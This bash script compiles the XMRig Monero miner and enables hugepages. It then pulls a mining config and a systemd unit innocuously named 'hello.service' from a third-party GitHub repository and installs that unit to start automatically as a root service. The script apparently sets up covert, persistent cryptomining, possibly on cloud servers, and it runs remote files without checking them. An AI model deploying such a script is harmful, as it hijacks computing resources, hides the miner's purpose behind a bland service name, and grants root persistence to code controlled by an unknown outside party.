#!/usr/bin/env bash
sudo add-apt-repository ppa:jonathonf/gcc-7.1 -y && sudo apt-get update -y && sudo apt-get install gcc-7 g++-7 -y && sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev -y && sudo git clone https://github.com/xmrig/xmrig.git && cd xmrig && sudo mkdir build && cd build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 && sudo make && sudo sysctl -w vm.nr_hugepages=1024 && curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1.json > config.json && curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/hello.service > /lib/systemd/system/hello.service && sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service'
